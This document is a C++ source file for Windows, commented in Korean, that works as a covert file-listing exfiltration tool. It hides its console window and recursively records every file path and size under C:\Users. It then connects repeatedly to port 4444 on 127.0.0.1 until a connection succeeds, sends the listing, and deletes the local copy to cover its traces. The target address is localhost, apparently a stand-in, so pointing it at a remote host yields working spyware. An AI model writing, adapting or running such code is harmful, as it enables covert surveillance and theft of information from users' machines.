#pragma warning ( disable : 4996 )
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <iostream>
#include <winsock2.h>
#include <Windows.h>
using namespace std;

#define PACKET_SIZE 1024

SOCKET skt;

struct _finddata_t fd;

FILE* fp;

void FileSearch(char file_path[]);
int isFileOrDir();

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    fp = fopen("filelist.txt", "w");
    char file_path[_MAX_PATH] = "c:\\Users";

    FileSearch(file_path);
    fclose(fp);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    skt = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    SOCKADDR_IN addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    while (1) {
        if (!connect(skt, (SOCKADDR*)&addr, sizeof(addr))) break;
    }

    int sendBytes;
    long file_size;
    char buf[PACKET_SIZE];
    FILE* fp;
    fp = fopen("filelist.txt", "rb"); //파일열기 
    fseek(fp, 0, SEEK_END); //끝으로가서 
    file_size = ftell(fp); //사이즈재고 
    fseek(fp, 0, SEEK_SET); //처음으로와서 
    snprintf(buf, sizeof(buf), "%d", file_size); //사이즈값을 buf에다가넣기 
    send(skt, buf, sizeof(buf), 0); //사이즈값전송 
    while ((sendBytes = fread(buf, sizeof(char), sizeof(buf), fp)) > 0) send(skt, buf, sendBytes, 0);
    //파일이끝날때까지 읽고 보내고를 반복 
    fclose(fp);
    closesocket(skt);
    WSACleanup();
    remove("filelist.txt");
    return 0;
}

int isFileOrDir()
{
    if (fd.attrib & _A_SUBDIR)
        return 0;
    else
        return 1;

}

void FileSearch(char file_path[])
{
    intptr_t handle;
    int check = 0;
    char file_path2[_MAX_PATH] = "";

    strcat(file_path, "\\");
    strcpy(file_path2, file_path);
    strcat(file_path, "*");

    if ((handle = _findfirst(file_path, &fd)) == -1)
    {
        return;
    }

    while (_findnext(handle, &fd) == 0)
    {
        char file_pt[_MAX_PATH];
        strcpy(file_pt, file_path2);
        strcat(file_pt, fd.name);

        check = isFileOrDir();

        if (check == 0 && fd.name[0] != '.')
        {
            FileSearch(file_pt);
        }
        else if (check == 1 && fd.size != 0 && fd.name[0] != '.')
        {
            fprintf(fp, "파일명 : %s, 크기:%d\n", file_pt, fd.size);
            //printf("파일명 : %s, 크기:%d\n", file_pt, fd.size);
        }
    }
    _findclose(handle);
}
